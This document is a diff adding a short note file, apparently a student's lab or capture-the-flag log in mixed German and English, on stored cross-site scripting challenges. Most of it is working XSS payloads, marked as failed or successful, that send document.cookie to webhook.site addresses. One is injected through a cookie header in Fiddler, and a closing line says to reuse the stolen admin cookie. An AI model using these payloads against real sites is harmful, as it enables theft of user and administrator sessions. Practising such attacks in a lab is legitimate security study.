@@ -1,0 +1,21 @@
+XSS Stored 1
+didnt work:
+	# Let the Admin Post his own coockie for us to read
+	document.getElementsByName("message")[0].value=document.cookie;
+	document.getElementsByTagName("input")[0].value="test";
+	document.getElementsByTagName("input")[1].click();
+	# Making http request in skript
+	Skript content got posted as plain text
+	var coo = document.cookie;
+	var test =new MLHttpRequest();
+	test.open("GET", "https://webhook.site/973773a7-efd8-4178-ba1a-9599c6d0c436?c=" + coo;, false);
+	test.send(null);
+worked:
+	<script>document.write("<img src=https://webhook.site/973773a7-efd8-4178-ba1a-9599c6d0c436/" + document.cookie + "></img>");</script>
+XSS Stored 2
+
+nach ewig langem rumptobieren:
+Cookie: status="><script>document.write("<img src='https://webhook.site/f8d20ff5-bf2b-409b-8631-a83bc8446715/" + document.cookie + "'")</script>;
+in Fiddler Composer.
+"> am anfang, damit das skript durch kommt, ' das sonnst die cookies zerschnitten werden
+Admin Cookie dann einfach per document.cookie setzen
